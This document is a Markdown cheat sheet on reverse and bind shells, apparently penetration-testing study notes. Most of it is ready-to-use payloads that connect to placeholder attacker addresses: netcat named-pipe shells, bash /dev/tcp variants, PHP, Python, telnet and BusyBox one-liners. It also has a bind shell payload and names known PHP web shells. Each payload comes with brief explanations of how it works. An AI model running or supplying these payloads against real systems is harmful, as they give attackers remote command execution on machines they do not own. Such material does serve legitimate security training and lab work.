## Reverse Shell

A reverse shell, also called a connect back shell, is a technique where the **target system initiates a connection back to the attacker**.
This is useful because outbound connections are often allowed by firewalls, making reverse shells harder to block than incoming ones.

### Netcat Listener

```
nc -lvnp 443
```

**Flags explanation**

- `-l` listen mode
- `-v` verbose output
- `-n` disable DNS resolution
- `-p` specify port

Commonly used ports include 53, 80, 443, 8080, 139, and 445 because they blend in with normal traffic.

---

## Pipe Reverse Shell Example

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

### How it Works

1. `rm -f /tmp/f`
   Removes any existing named pipe

2. `mkfifo /tmp/f`
   Creates a FIFO named pipe for two way communication

3. `cat /tmp/f`
   Reads input from the pipe

4. `| sh -i 2>&1`
   Sends input to an interactive shell and redirects errors to output

5. `| nc ATTACKER_IP ATTACKER_PORT`
   Sends shell output to the attacker

6. `>/tmp/f`
   Feeds responses back into the pipe to allow interaction

This creates a fully interactive reverse shell.

---

## Bind Shell

A bind shell opens a listening port **on the target machine**.
The attacker then connects to that port.

### Bind Shell Payload

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Explanation

- The named pipe enables two way communication
- Netcat listens on port 8080
- When a connection occurs, the shell is exposed

### Connecting to the Bind Shell

```
nc -nv TARGET_IP 8080
```

**Flags**

- `-n` disable DNS
- `-v` verbose mode

Ports below 1024 require elevated privileges, so higher ports like 8080 are preferred.

---

## Improving Shell Interaction

```
rlwrap nc -lvnp 443
```

`rlwrap` enables arrow keys, command history, and better usability.

---

## Ncat

Ncat is an enhanced version of Netcat from the Nmap project.

Features include:

- SSL encryption
- Better IPv6 support
- Improved reliability

---

## Bash Reverse Shells Using /dev/tcp

### Basic Bash Reverse Shell

```
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

Redirects input and output through a TCP connection.

---

### File Descriptor Based Bash Shells

```
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

```
0<&196; exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

```
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

These techniques use custom file descriptors to maintain an interactive session.

---

## PHP Reverse Shells

```
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

Other PHP execution methods:

- `shell_exec`
- `system`
- `passthru`
- `popen`

Each method runs a shell and redirects input and output through the socket.

---

## Python Reverse Shells

### Using Environment Variables

```
python -c 'import sys,socket,os,pty; s=socket.socket(); s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("bash")'
```

### Using subprocess

```
python -c 'import socket,os,pty; s=socket.socket(); s.connect(("ATTACKER_IP",443)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("bash")'
```

### Short Python Shell

```
python -c 'import os,pty,socket; s=socket.socket(); s.connect(("ATTACKER_IP",443)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("bash")'
```

---

## Other Reverse Shell Techniques

### Telnet

```
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

---

### AWK

Uses AWK’s built in TCP support to create a shell over the network.

---

### BusyBox

```
busybox nc ATTACKER_IP 443 -e sh
```

Often used on embedded systems and minimal Linux environments.

---

## Web Shells

Common PHP web shells include:

- p0wny-shell
- b374k
- c99

They provide browser based command execution and file management.

More examples can be found on well known web shell repositories used for defensive research and lab environments.
